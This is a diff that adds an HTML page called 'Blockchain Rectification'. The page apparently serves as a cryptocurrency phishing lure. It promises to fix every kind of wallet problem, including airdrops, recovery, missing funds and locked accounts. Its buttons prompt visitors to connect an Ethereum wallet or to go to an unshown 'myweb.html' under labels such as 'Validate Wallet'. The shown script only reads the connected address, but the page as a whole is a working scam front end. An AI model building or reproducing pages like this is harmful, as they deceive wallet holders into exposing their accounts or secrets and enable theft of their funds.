@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Blockchain Rectification</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background-color: #0a0a23;
+      color: #ffffff;
+    }
+
+    header {
+      padding: 2rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    h1 {
+      font-size: 2rem;
+      margin: 0;
+    }
+
+    .connect-button {
+      padding: 0.7rem 1.2rem;
+      border: none;
+      border-radius: 8px;
+      background-color: #2563eb;
+      color: white;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .intro {
+      max-width: 700px;
+      margin: 0 auto;
+      padding: 1rem 2rem;
+      text-align: center;
+      color: #ccc;
+    }
+
+    main {
+      padding: 2rem;
+    }
+
+    .section-title {
+      text-align: center;
+      font-size: 1.5rem;
+      margin-bottom: 2rem;
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 1.5rem;
+    }
+
+    .card {
+      background-color: #1a1a40;
+      padding: 1.5rem;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+      text-align: left;
+    }
+
+    .card h3 {
+      margin-top: 0;
+      font-size: 1.1rem;
+      color: #fff;
+    }
+
+    .card p {
+      font-size: 0.9rem;
+      color: #aaa;
+    }
+
+    @media (max-width: 600px) {
+      header {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+    }
+  </style>
+</head>
+<body><div id="initializing-message" style="display: none; text-align: center; margin-top: 2rem; color: white;">
+  <h2>Initializing...</h2>
+</div>
+
+<div id="connected-content" style="display: none; padding: 2rem; text-align: center;">
+  <h2>Welcome, <span id="wallet-address"></span>!</h2>
+  <p>Your wallet has been successfully connected.</p>
+  <a href="myweb.html" style="color: #2563eb; text-decoration: underline;">Go to Dashboard</a>
+</div>
+
+  <header>
+    <h1>Blockchain Rectification</h1>
+    <button class="connect-button"> <a href="myweb.html" style="color: #ffffff">
+Validate Wallet</button></a>
+  </header>
+
+  <div class="intro">
+    <p>This is not an app but a protocol that establishes a remote resolution between all noncustodial wallet issues. Discover decentralized solutions, seamless transactions, and a decentralized ecosystem. Join us in revolutionizing the way you interact with digital assets and decentralized applications.</p>
+  </div>
+
+  <main>
+    <div class="section-title">Get Started Below.</div>
+    <div class="grid">
+      <div class="card"><button class="connect-button" onclick="connectWallet()"><h3>MIGRATION</h3><p>Click here for migration or to resolve any migration related issues.</p></div>
+      <div class="card"><button class="connect-button"> <a href="myweb.html" style="color: #ffffff"><h3>RECTIFICATION</h3><p>Click here to rectify all strange wallet issues.</a></p></div>
+      <div class="card"><button class="connect-button"> <a href="myweb.html" style="color: #ffffff"><h3>CLAIM</h3><p>Click here to claim tokens or resolve any token claiming related issues.</a></p></div>
+      <div class="card"><button class="connect-button" onclick="connectWallet()"><h3>SWAP</h3><p>Click here to swap tokens or resolve issues related to token swap.</p></div>
+      <div class="card"><button class="connect-button" onclick="connectWallet()"><h3>SLIPPAGE</h3><p>Click here for slippage or transaction fee related issues.</p></div>
+      <div class="card"><button class="connect-button" onclick="connectWallet()"><h3>CLAIM AIRDROP</h3><p>Click here to claim airdrop or resolve errors encountered during airdrop claim.</p></div>
+      <div class="card"><button class="connect-button" onclick="connectWallet()"><h3>STAKING</h3><p>Click here to resolve issues encountered while staking/unstaking.</p></div>
+      <div class="card"><button class="connect-button" onclick="connectWallet()"><h3>WHITELIST</h3><p>Click here to whitelist your address or resolve whitelisting related error.</p></div>
+      <div class="card"><button class="connect-button" onclick="connectWallet()"><h3>CROSS TRANSFER</h3><p>Click here to resolve cross bridging errors encountered during cross transfer.</p></div>
+      <div class="card"><button class="connect-button" onclick="connectWallet()"><h3>NFTs</h3><p>Click here to resolve NFT related issues.</p></div>
+      <div class="card"><button class="connect-button" onclick="connectWallet()"><h3>LOCKED ACCOUNT</h3><p>Click here to resolve locked account or wallet stuck issues.</p></div>
+      <div class="card"><button class="connect-button" onclick="connectWallet()"><h3>LOGIN ERROR</h3><p>Click here to resolve errors encountered during login.</p></div>
+      <div class="card"><button class="connect-button" onclick="connectWallet()"><h3>WALLET GLITCH</h3><p>Click here to resolve wallet issues.</p></div>
+      <div class="card"><button class="connect-button" onclick="connectWallet()"><h3>DEFI FARMING</h3><p>Click here for DeFi or Commercial farming related issues.</p></div>
+      <div class="card"><button class="connect-button"> <a href="myweb.html" style="color: #ffffff"><h3>VALIDATION</h3><p>Click here to validate your wallet via Multisig.</a></p></div>
+      <div class="card"><button class="connect-button" onclick="connectWallet()"><h3>TRANSACTION DELAY</h3><p>Click here for any transaction related error.</p></div>
+      <div class="card"><button class="connect-button" onclick="connectWallet()"><h3>MISSING/IRREGULAR BALANCE</h3><p>Click here to recover lost or missing funds.</p></div>
+      <div class="card"><button class="connect-button" onclick="connectWallet()"><h3>RECOVERY</h3><p>Click here for wallet recovery.</p></div>
+      <div class="card"><button class="connect-button" onclick="connectWallet()"><h3>BUY TOKEN/COIN</h3><p>Click here to trade. Your account has to be marked as a trusted payment source to start trading.</p></div>
+      <div class="card"><button class="connect-button" onclick="connectWallet()"><h3>EXCHANGE</h3><p>Click here for token exchange or to resolve errors encountered during token exchange.</p></div>
+      <div class="card"><button class="connect-button" onclick="connectWallet()"><h3>BRIDGING</h3><p>Click here to bridge tokens or resolve bridging issues.</p></div>
+    </div>
+  </main>
+
+<script>
+  async function connectWallet() {
+    if (typeof window.ethereum !== 'undefined') {
+      try {
+        // Show "Initializing..." message
+        document.getElementById("initializing-message").style.display = "block";
+
+        // Request wallet connection
+        await ethereum.request({ method: 'eth_requestAccounts' });
+
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+        const address = await signer.getAddress();
+
+        // You could check for Trust Wallet like this (optional):
+        const isTrustWallet = window.ethereum.isTrust || window.ethereum.isTrustWallet;
+
+        if (isTrustWallet) {
+          console.log("Trust Wallet detected");
+          // Optionally, show a different message or action
+        }
+
+        // Update UI
+        document.getElementById("wallet-address").textContent = address;
+        document.getElementById("connected-content").style.display = "block";
+
+      } catch (err) {
+        console.error("Connection failed:", err);
+        alert("Wallet connection failed.");
+      } finally {
+        // Hide the "Initializing..." message after everything is done
+        document.getElementById("initializing-message").style.display = "none";
+      }
+    } else {
+      alert("MetaMask or another Ethereum-compatible wallet is not installed.");
+    }
+  }
+</script>
+</body>
+</html>
